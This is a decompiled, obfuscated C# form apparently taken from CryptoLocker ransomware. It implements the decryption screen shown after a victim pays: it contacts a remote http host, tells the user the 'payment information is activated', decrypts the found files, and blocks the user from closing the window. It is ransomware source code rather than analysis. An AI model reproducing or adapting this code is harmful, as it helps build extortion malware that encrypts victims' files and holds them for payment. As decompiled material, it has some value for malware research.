using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Final
{
	public class Form4 : Form
	{
		[CompilerGenerated]
		private sealed class Class1
		{
			public string string_0;

			public Form4 form4_0;

			public void method_0()
			{
				this.form4_0.method_2(this.string_0);
			}
		}

		private GClass0 gclass0_0 = new GClass0();

		private string[] string_0;

		private System.Windows.Forms.Timer timer_0 = Delegate15.smethod_0();

		private IContainer icontainer_0;

		private PictureBox pictureBox_0;

		private Label label_0;

		private Label label_1;

		private Label label_2;

		private Label label_3;

		private Label label_4;

		private Label label_5;

		private Panel panel_0;

		private Label label_6;

		private Label label_7;

		private ProgressBar progressBar_0;

		private Label label_8;

		private Label label_9;

		private ProgressBar progressBar_1;

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = Delegate85.smethod_0(this);
				Delegate87.smethod_0(createParams, Delegate86.smethod_0(createParams) | 512);
				return createParams;
			}
		}

		public Form4()
		{
			this.method_3();
		}

		protected override void WndProc(ref Message m)
		{
			if (m.Msg == 274 && m.WParam.ToInt32() == 61456)
			{
				return;
			}
			if (m.Msg == 161 && m.WParam.ToInt32() == 2)
			{
				return;
			}
			Delegate84.smethod_0(this, ref m);
		}

		private void method_0(object sender, EventArgs e)
		{
			Form4.Class1 @class = new Form4.Class1();
			@class.form4_0 = this;
			this.gclass0_0.method_7();
			this.string_0 = this.gclass0_0.method_20();
			@class.string_0 = Delegate88.smethod_0("http://", this.gclass0_0.method_4(), "/");
			Delegate102.smethod_0(this.progressBar_1, 30);
			Thread object_ = Delegate16.smethod_0(new ThreadStart(@class.method_0));
			Delegate103.smethod_0(object_);
		}

		private void method_1(object sender, EventArgs e)
		{
			Delegate41.smethod_5(this);
			Form3 object_ = new Form3();
			Delegate41.smethod_4(object_);
		}

		public void method_2(string string_1)
		{
			Delegate104.smethod_0(5000);
			Mutex object_ = Delegate17.smethod_0();
			if (this.gclass0_0.method_13(string_1))
			{
				Delegate105.smethod_0(this.progressBar_0, ProgressBarStyle.Blocks);
				Delegate102.smethod_1(this.progressBar_0, 0);
				Delegate102.smethod_2(this.progressBar_0, this.gclass0_0.method_22());
				Delegate83.smethod_3(this.progressBar_1, false);
				string[] array = this.string_0;
				for (int i = 0; i < array.Length; i++)
				{
					string string_2 = array[i];
					Delegate106.smethod_0(object_);
					if (!Delegate98.smethod_1(string_2, ""))
					{
						Delegate54.smethod_0(this.label_8, string_2);
						Delegate102.smethod_3(this.progressBar_0, 1);
						this.gclass0_0.method_21(string_2);
						Delegate107.smethod_0(object_);
					}
				}
				Delegate106.smethod_0(object_);
				DialogResult dialogResult = Delegate97.smethod_0("Search and decryption of the found files completed. \n\nMake sure that all important files have been decrypted! If part of the files had not been decrypted - move them to the desktop and click <<Retry>> button. \n\nOtherwise, press <<Cancel>> button - this will delete the software from this computer. Please restart your computer to completely destroy this software!", "Attention!", MessageBoxButtons.RetryCancel, MessageBoxIcon.Exclamation);
				if (dialogResult == DialogResult.Retry)
				{
					this.gclass0_0.method_23();
					this.gclass0_0.method_24();
				}
				else
				{
					this.gclass0_0.method_24();
				}
				Delegate107.smethod_0(object_);
			}
			Delegate108.smethod_0();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
			Delegate40.smethod_0(this, disposing);
		}

		private void method_3()
		{
			ComponentResourceManager object_ = Delegate2.smethod_0(Delegate38.smethod_0(typeof(Form4).TypeHandle));
			this.pictureBox_0 = Delegate3.smethod_0();
			this.label_0 = Delegate4.smethod_0();
			this.label_1 = Delegate4.smethod_0();
			this.label_2 = Delegate4.smethod_0();
			this.label_3 = Delegate4.smethod_0();
			this.label_4 = Delegate4.smethod_0();
			this.label_5 = Delegate4.smethod_0();
			this.panel_0 = Delegate7.smethod_0();
			this.label_9 = Delegate4.smethod_0();
			this.label_8 = Delegate4.smethod_0();
			this.progressBar_0 = Delegate18.smethod_0();
			this.label_7 = Delegate4.smethod_0();
			this.label_6 = Delegate4.smethod_0();
			this.progressBar_1 = Delegate18.smethod_0();
			((ISupportInitialize)this.pictureBox_0).BeginInit();
			Delegate41.smethod_0(this.panel_0);
			Delegate41.smethod_1(this);
			Delegate42.smethod_0(this.pictureBox_0, null);
			Delegate42.smethod_1(this.pictureBox_0, (Image)Delegate43.smethod_0(object_, "pictureBox1.Image"));
			Delegate44.smethod_0(this.pictureBox_0, Delegate11.smethod_0(12, 57));
			Delegate45.smethod_0(this.pictureBox_0, "pictureBox1");
			Delegate46.smethod_0(this.pictureBox_0, Delegate12.smethod_0(255, 258));
			Delegate47.smethod_0(this.pictureBox_0, 2);
			Delegate48.smethod_0(this.pictureBox_0, false);
			Delegate49.smethod_0(this.label_0, true);
			Delegate52.smethod_1(this.label_0, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_0, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_0, Delegate11.smethod_0(364, 105));
			Delegate45.smethod_0(this.label_0, "label11");
			Delegate46.smethod_0(this.label_0, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_0, 22);
			Delegate49.smethod_0(this.label_1, true);
			Delegate52.smethod_1(this.label_1, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_1, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_1, Delegate11.smethod_0(344, 135));
			Delegate45.smethod_0(this.label_1, "label12");
			Delegate46.smethod_0(this.label_1, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_1, 23);
			Delegate49.smethod_0(this.label_2, true);
			Delegate52.smethod_1(this.label_2, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_2, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_2, Delegate11.smethod_0(305, 164));
			Delegate45.smethod_0(this.label_2, "label13");
			Delegate46.smethod_0(this.label_2, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_2, 24);
			Delegate49.smethod_0(this.label_3, true);
			Delegate52.smethod_1(this.label_3, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_3, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_3, Delegate11.smethod_0(341, 192));
			Delegate45.smethod_0(this.label_3, "label14");
			Delegate46.smethod_0(this.label_3, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_3, 25);
			Delegate49.smethod_0(this.label_4, true);
			Delegate52.smethod_1(this.label_4, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_4, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_4, Delegate11.smethod_0(321, 251));
			Delegate45.smethod_0(this.label_4, "label16");
			Delegate46.smethod_0(this.label_4, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_4, 27);
			Delegate49.smethod_0(this.label_5, true);
			Delegate50.smethod_0(this.label_5, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_5, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_5, Delegate11.smethod_0(416, 25));
			Delegate45.smethod_0(this.label_5, "label1");
			Delegate46.smethod_0(this.label_5, Delegate12.smethod_0(170, 24));
			Delegate53.smethod_0(this.label_5, 0);
			Delegate54.smethod_0(this.label_5, "Files decryption");
			Delegate52.smethod_1(this.panel_0, Delegate51.smethod_0());
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.progressBar_1);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_9);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_8);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.progressBar_0);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_7);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_6);
			Delegate44.smethod_0(this.panel_0, Delegate11.smethod_0(274, 57));
			Delegate45.smethod_0(this.panel_0, "panel1");
			Delegate46.smethod_0(this.panel_0, Delegate12.smethod_0(432, 450));
			Delegate53.smethod_0(this.panel_0, 29);
			Delegate49.smethod_0(this.label_9, true);
			Delegate50.smethod_0(this.label_9, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_9, Delegate51.smethod_4());
			Delegate44.smethod_0(this.label_9, Delegate11.smethod_0(17, 327));
			Delegate45.smethod_0(this.label_9, "label2");
			Delegate46.smethod_0(this.label_9, Delegate12.smethod_0(390, 98));
			Delegate53.smethod_0(this.label_9, 5);
			Delegate54.smethod_0(this.label_9, Delegate67.smethod_0(object_, "label2.Text"));
			Delegate109.smethod_0(this.label_9, ContentAlignment.TopCenter);
			Delegate49.smethod_0(this.label_8, true);
			Delegate50.smethod_0(this.label_8, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_8, Delegate11.smethod_0(17, 149));
			Delegate45.smethod_0(this.label_8, "label17");
			Delegate46.smethod_0(this.label_8, Delegate12.smethod_0(20, 14));
			Delegate53.smethod_0(this.label_8, 4);
			Delegate54.smethod_0(this.label_8, "C:\\");
			Delegate44.smethod_0(this.progressBar_0, Delegate11.smethod_0(17, 168));
			Delegate45.smethod_0(this.progressBar_0, "progressBar1");
			Delegate46.smethod_0(this.progressBar_0, Delegate12.smethod_0(398, 23));
			Delegate105.smethod_0(this.progressBar_0, ProgressBarStyle.Marquee);
			Delegate53.smethod_0(this.progressBar_0, 3);
			Delegate49.smethod_0(this.label_7, true);
			Delegate50.smethod_0(this.label_7, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_7, Delegate11.smethod_0(122, 45));
			Delegate45.smethod_0(this.label_7, "label15");
			Delegate46.smethod_0(this.label_7, Delegate12.smethod_0(200, 14));
			Delegate53.smethod_0(this.label_7, 2);
			Delegate54.smethod_0(this.label_7, "Search and recovery of encrypted files!");
			Delegate109.smethod_0(this.label_7, ContentAlignment.TopCenter);
			Delegate49.smethod_0(this.label_6, true);
			Delegate50.smethod_0(this.label_6, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_6, Delegate11.smethod_0(122, 19));
			Delegate45.smethod_0(this.label_6, "label4");
			Delegate46.smethod_0(this.label_6, Delegate12.smethod_0(190, 14));
			Delegate53.smethod_0(this.label_6, 1);
			Delegate54.smethod_0(this.label_6, "Your payment information is activated!");
			Delegate109.smethod_0(this.label_6, ContentAlignment.TopCenter);
			Delegate44.smethod_0(this.progressBar_1, Delegate11.smethod_0(17, 168));
			Delegate45.smethod_0(this.progressBar_1, "progressBar2");
			Delegate46.smethod_0(this.progressBar_1, Delegate12.smethod_0(398, 23));
			Delegate105.smethod_0(this.progressBar_1, ProgressBarStyle.Marquee);
			Delegate53.smethod_0(this.progressBar_1, 6);
			Delegate73.smethod_0(this, Delegate14.smethod_0(6f, 13f));
			Delegate74.smethod_0(this, AutoScaleMode.Font);
			Delegate52.smethod_1(this, Delegate51.smethod_4());
			Delegate75.smethod_0(this, Delegate12.smethod_0(721, 573));
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.panel_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_4);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_3);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_2);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_1);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.pictureBox_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_5);
			Delegate77.smethod_0(this, Delegate76.smethod_0());
			Delegate78.smethod_0(this, FormBorderStyle.Fixed3D);
			Delegate79.smethod_0(this, (Icon)Delegate43.smethod_0(object_, "$this.Icon"));
			Delegate80.smethod_0(this, false);
			Delegate80.smethod_1(this, false);
			Delegate45.smethod_1(this, "Form4");
			Delegate80.smethod_2(this, false);
			Delegate81.smethod_0(this, FormStartPosition.CenterScreen);
			Delegate54.smethod_0(this, "CryptoLocker");
			Delegate82.smethod_0(this, new EventHandler(this.method_0));
			((ISupportInitialize)this.pictureBox_0).EndInit();
			Delegate83.smethod_0(this.panel_0, false);
			Delegate41.smethod_2(this.panel_0);
			Delegate83.smethod_1(this, false);
			Delegate41.smethod_3(this);
		}
	}
}
